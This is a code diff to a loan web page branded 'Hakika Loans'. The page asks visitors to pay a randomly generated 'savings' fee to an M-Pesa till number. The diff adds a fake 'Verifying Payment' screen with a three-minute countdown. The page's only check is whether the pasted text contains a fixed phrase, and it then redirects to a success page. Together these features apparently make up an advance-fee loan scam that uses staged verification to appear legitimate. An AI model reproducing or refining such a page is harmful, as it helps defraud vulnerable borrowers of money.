@@ -79,6 +79,20 @@
       color: #ccc;
     }
 
+    #loadingModal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.85);
+      z-index: 1000;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
     @media (max-width: 480px) {
       .card {
         padding: 15px;
@@ -103,9 +117,7 @@
         <li>Go to M~Pesa: <strong>M~pesa</strong></li>
         <li>Lipa na M~Pesa: <strong>Buy Goods & Services</strong></li>
         <li>Enter Till Number: <strong id="tillNumber">9824375</strong></li>
-        <li>
-          <button class="btn copy-btn" onclick="copyTill()">CLICK TO COPY TILL</button>
-        </li>
+        <li><button class="btn copy-btn" onclick="copyTill()">CLICK TO COPY TILL</button></li>
         <li>Enter Amount: <strong id="savingAmount2">Ksh ...</strong></li>
         <li>Complete Payment: <strong>Enter M~Pesa Pin</strong></li>
       </ul>
@@ -119,12 +131,21 @@
 
   <div class="footer">© Hakika Loans 2025</div>
 
+  <!-- Loading Modal -->
+  <div id="loadingModal">
+    <h2 style="font-size: 1.8rem;">Verifying Payment...</h2>
+    <p style="margin-top:10px; font-size: 1.2rem;">Please wait <span id="countdown">3:00</span> minutes</p>
+  </div>
+
   <script>
-    // Get loan amount
+    // Get loan amount from localStorage
     const loanAmount = parseInt(localStorage.getItem("loanAmount")) || 4790;
 
-    // Generate savings amount: range increases with loan
-    const savingsAmount = Math.floor(Math.random() * (loanAmount > 7000 ? 850 - 600 : loanAmount > 4000 ? 600 - 250 : 250 - 100) + (loanAmount > 7000 ? 600 : loanAmount > 4000 ? 250 : 100));
+    // Generate savings amount based on loan tiers
+    const savingsAmount = Math.floor(
+      Math.random() * (loanAmount > 7000 ? 250 : loanAmount > 4000 ? 350 : 150) +
+      (loanAmount > 7000 ? 600 : loanAmount > 4000 ? 250 : 100)
+    );
 
     document.getElementById("loanAmount").textContent = "Ksh " + loanAmount.toLocaleString();
     document.getElementById("savingAmount").textContent = "Ksh " + savingsAmount;
@@ -140,18 +161,26 @@
     function verifyPayment() {
       const message = document.getElementById("mpesaMessage").value.toUpperCase();
       if (message.includes("HAKIKA R PROVISION")) {
-        alert("✅ Payment verified successfully! Redirecting...");
-        window.location.href = "success.html";
+        // Show loading modal
+        document.getElementById("loadingModal").style.display = "flex";
+        let time = 180; // 3 minutes countdown
+
+        const timer = setInterval(() => {
+          let minutes = Math.floor(time / 60);
+          let seconds = time % 60;
+          document.getElementById("countdown").textContent =
+            `${minutes}:${seconds < 10 ? "0" + seconds : seconds}`;
+          time--;
+
+          if (time < 0) {
+            clearInterval(timer);
+            window.location.href = "success.html";
+          }
+        }, 1000);
       } else {
         alert("❌ Verification failed. Make sure the message includes HAKIKA R PROVISION.");
       }
     }
   </script>
-  <!-- Loading Modal -->
-<div id="loadingModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:1000; color:white; display:flex; flex-direction:column; align-items:center; justify-content:center;">
-  <h2 style="font-size: 1.8rem;">Verifying Payment...</h2>
-  <p style="margin-top:10px; font-size: 1.2rem;">Please wait <span id="countdown">3:00</span> minutes</p>
-</div>
-
 </body>
 </html>
